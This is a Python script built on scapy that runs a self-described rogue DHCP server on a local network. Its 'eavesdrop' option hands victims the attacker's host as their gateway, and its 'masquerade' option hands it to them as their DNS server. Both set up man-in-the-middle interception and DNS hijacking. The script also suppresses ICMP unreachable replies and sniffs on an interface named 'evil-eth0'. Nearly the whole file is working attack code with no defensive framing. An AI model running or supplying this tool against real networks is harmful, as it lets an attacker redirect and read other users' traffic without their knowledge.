#!/usr/bin/env python3

import os
import sys
import argparse
import subprocess
import struct, socket
from scapy.all import *
from time import time,sleep
from threading import Timer, Lock


class RepeatedTimer(object):
	def __init__(self, interval, function, *args, **kwargs):
		self._timer     = None
		self.interval   = interval
		self.function   = function
		self.args       = args
		self.kwargs     = kwargs
		self.is_running = False
		self.start()

	def _run(self):
		self.is_running = False
		self.start()
		self.function(*self.args, **self.kwargs)

	def start(self):
		if not self.is_running:
			self._timer = Timer(self.interval, self._run)
			self._timer.start()
			self.is_running = True

	def stop(self):
		self._timer.cancel()
		self.is_running = False


# ip string -> integer
ip2int = lambda ipstr: struct.unpack('!I', socket.inet_aton(ipstr))[0]

# integer -> ip string
int2ip = lambda n: socket.inet_ntoa(struct.pack('!I', n))


class DHCPserver:
	def __init__(self, iface, host_ip, start_ip, end_ip, 
				lease_time, subnet_mask, router, 
				name_server='8.8.8.8', domain='local'):
		self.iface = iface
		self.host_ip = host_ip
		self.unassigned_ips = [int2ip(num) for num in reversed(range(ip2int(start_ip), ip2int(end_ip)+1))]
		try:
			self.unassigned_ips.remove(host_ip)
		except:
			pass
		self.assigned_ips = {}
		self.lease_time = lease_time
		self.subnet_mask = subnet_mask
		self.router = router
		self.name_server = name_server
		self.domain = domain
		self.lock_uip = Lock()
		self.lock_aips = {ip : Lock() for ip in self.unassigned_ips}
	
	def offerIP(self):
		self.lock_uip.acquire()
		ip = self.unassigned_ips.pop()
		self.lock_uip.release()
		return ip
	
	def offerPacketCreate(self, discover_packet):
		ether = Ether(dst='ff:ff:ff:ff:ff:ff')
		dst_ip = '255.255.255.255' if discover_packet[IP].src == '0.0.0.0' else discover_packet[IP].src
		ip = IP(src=self.host_ip, dst=dst_ip)
		udp = UDP(sport=discover_packet[UDP].dport, dport=discover_packet[UDP].sport)
		offer_ip = self.offerIP()
		if offer_ip is None:
			return None
		bootp = BOOTP(op=2, xid=discover_packet[BOOTP].xid, yiaddr=offer_ip, chaddr=discover_packet[BOOTP].chaddr)
		dhcp = DHCP(options=[('message-type', 2),
							('server_id', self.host_ip),
							('lease_time', self.lease_time),
							('subnet_mask', self.subnet_mask),
							('router', self.router),
							('name_server', self.name_server),
							('domain', self.domain),
							'end'])
		offer_packet = ether / ip / udp / bootp / dhcp
		self.lock_aips[offer_ip].acquire()
		self.assigned_ips.update({offer_ip : (time(), False, offer_packet)})
		self.lock_aips[offer_ip].release()
		return offer_packet
		
	def ackIP(self, ip):
		if ip not in self.lock_aips:
			return None
		self.lock_aips[ip].acquire()
		value = self.assigned_ips.get(ip)
		self.lock_aips[ip].release()
		if value is not None and (value[1] is False or value[2][IP].dst == ip):
			return value[2]
		
	def ackPacketCreate(self, request_packet):
		requested_addr = request_packet[IP].src
		new_packet = ack_packet = self.ackIP(requested_addr)
		
		if ack_packet is None:
			requested_addr = self.get_option(request_packet[DHCP].options, 'requested_addr')
			ack_packet = self.ackIP(requested_addr)
			
			if ack_packet is None:
				return None
			
			ack_packet[DHCP].options[0] = ('message-type', 5)
			
			new_packet = ack_packet
			new_packet[Ether].dst = request_packet[Ether].src
			new_packet[IP].dst = requested_addr
			new_packet[BOOTP].ciaddr = requested_addr

		self.lock_aips[requested_addr].acquire()
		self.assigned_ips[requested_addr]=(time(), True, new_packet)
		self.lock_aips[requested_addr].release()
		return ack_packet
	
	def releaseIP(self, ip):
		self.lock_aips[ip].acquire()
		value = self.assigned_ips.pop(ip)
		self.lock_aips[ip].release()
		self.lock_uip.acquire()
		self.unassigned_ips.append(ip)
		self.lock_uip.release()
		
	def _daemon_run(self):
		for ip in self.assigned_ips.keys():
			self.lock_aips[ip].acquire()
			value = self.assigned_ips[ip]
			if time() - value[0] >= self.lease_time:
				self.assigned_ips.pop(ip)
				self.lock_aips[ip].release()
				self.lock_uip.acquire()
				self.unassigned_ips.append(ip)
				self.lock_uip.release()
			else:
				self.lock_aips[ip].release()
	

	# Fixup function to extract dhcp_options by key
	def get_option(self, dhcp_options, key):
	 
		must_decode = ['hostname', 'domain', 'vendor_class_id']
		try:
			for i in dhcp_options:
				if i[0] == key:
					# If DHCP Server Returned multiple name servers 
					# return all as comma seperated string.
					if key == 'name_server' and len(i) >= 2:
						return ",".join(i[1:])
					# domain and hostname are binary strings,
					# decode to unicode string before returning
					elif key in must_decode:
						return i[1].decode()
					else: 
						return i[1]        
		except:
			pass
	 
	 
	def handle_dhcp_packet(self, packet):
	 
		if DHCP not in packet:
			print('---')
			print('NonDHCP Packet')
			print(packet.summary())
			print(ls(packet))
		
		# Match DHCP discover
		elif packet[DHCP].options[0][1] == 1:
			print('---')
			print('New DHCP Discover')
			#print(packet.summary())
			#print(ls(packet))
			hostname = self.get_option(packet[DHCP].options, 'hostname')
			print("Host {} ({}) asked for an IP".format(hostname, packet[Ether].src))
	 
			# Send DHCP offer
			offer_packet = self.offerPacketCreate(packet)
			sendp(offer_packet, iface=self.iface)
			#print(ls(offer_packet))
			#print('\n')
			
		# Match DHCP offer
		elif packet[DHCP].options[0][1] == 2:
			print('---')
			print('New DHCP Offer')
			#print(packet.summary())
			#print(ls(packet))
	 
			subnet_mask = self.get_option(packet[DHCP].options, 'subnet_mask')
			lease_time = self.get_option(packet[DHCP].options, 'lease_time')
			router = self.get_option(packet[DHCP].options, 'router')
			name_server = self.get_option(packet[DHCP].options, 'name_server')
			domain = self.get_option(packet[DHCP].options, 'domain')
	 
			print("DHCP Server {} ({}) ".format(packet[IP].src, packet[Ether].src),
				  "offered {}".format(packet[BOOTP].yiaddr))
	 
			print("DHCP Options: subnet_mask: {}, lease_time: ".format(subnet_mask),
				  "{}, router: {}, name_server: {}, ".format(lease_time, router, name_server),
				  "domain: {}".format(domain))
	 
	 
		# Match DHCP request
		elif packet[DHCP].options[0][1] == 3:
			print('---')
			print('New DHCP Request')
			#print(packet.summary())
			#print(ls(packet))
	 
			requested_addr = self.get_option(packet[DHCP].options, 'requested_addr')
			hostname = self.get_option(packet[DHCP].options, 'hostname')
			print("Host {} ({}) requested {}".format(hostname, packet[Ether].src, requested_addr))
			
			# Send DHCP ack
			ack_packet = self.ackPacketCreate(packet)
			sendp(ack_packet, iface=self.iface)
	 
		# Match DHCP ack
		elif packet[DHCP].options[0][1] == 5:
			print('---')
			print('New DHCP Ack')
			#print(packet.summary())
			#print(ls(packet))
	 
			subnet_mask = self.get_option(packet[DHCP].options, 'subnet_mask')
			lease_time = self.get_option(packet[DHCP].options, 'lease_time')
			router = self.get_option(packet[DHCP].options, 'router')
			name_server = self.get_option(packet[DHCP].options, 'name_server')
	 
			print("DHCP Server {} ({}) ".format(packet[IP].src, packet[Ether].src),
				  "acked {}".format(packet[BOOTP].yiaddr))
	 
			print("DHCP Options: subnet_mask: {}, lease_time: ".format(subnet_mask),
				  "{}, router: {}, name_server: {}".format(lease_time, router, name_server))
	 
		# Match DHCP inform
		elif packet[DHCP].options[0][1] == 8:
			print('---')
			print('New DHCP Inform')
			#print(packet.summary())
			#print(ls(packet))
	 
			hostname = self.get_option(packet[DHCP].options, 'hostname')
			vendor_class_id = self.get_option(packet[DHCP].options, 'vendor_class_id')
	 
			print("DHCP Inform from {} ({}) ".format(packet[IP].src, packet[Ether].src),
				  "hostname: {}, vendor_class_id: {}".format(hostname, vendor_class_id))
	 
		else:
			print('---')
			print('Some Other DHCP Packet')
			print(packet.summary())
			print(ls(packet))
	 
		return

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Run a rogue DHCP server')
	parser.version = '1.0'
	parser.add_argument('Interface',
                       metavar='interface',
                       type=str,
                       help='the interface on which to get Internet access, e.g. eth0')
	parser.add_argument('IP address',
                       metavar='ip_address',
                       type=str,
                       help='the ip address of the given interface, e.g. 192.168.56.101')
	parser.add_argument('-m',
                       '--masquerade',
                       action='store_true',
                       help='enable masquerade attack')
	parser.add_argument('-e',
                       '--eavesdrop',
                       action='store_true',
                       help='enable eavesdrop attack')

	args = vars(parser.parse_args())
	
	iface = args['Interface']
	host_ip = args['IP address']
	start_ip = int2ip(ip2int(host_ip) - 40)
	end_ip = int2ip(ip2int(host_ip) + 40)
	lease_time = 7
	subnet_mask = '255.255.255.0'
	if args['eavesdrop']:
		router = host_ip
	else:
		router = subprocess.Popen('route -n | awk \'$4 == "UG" {print $2}\'', shell=True, stdout=subprocess.PIPE).stdout.read().strip()
	if args['masquerade']:
		name_server = host_ip
	else:	
		name_server = '8.8.8.8'
	
	dhcp = DHCPserver(iface=iface,
					host_ip=host_ip,
					start_ip=start_ip,
					end_ip=end_ip,
					lease_time=lease_time,
					subnet_mask=subnet_mask, 
					router=router,
					name_server=name_server)
	daemon = RepeatedTimer(dhcp.lease_time / 2, dhcp._daemon_run)
	try:
		os.system('iptables -I OUTPUT -p icmp --icmp-type destination-unreachable -j DROP')
		sniff(iface="evil-eth0", filter="udp and (port 67 or 68)", prn=dhcp.handle_dhcp_packet)
	finally:
		daemon.stop()
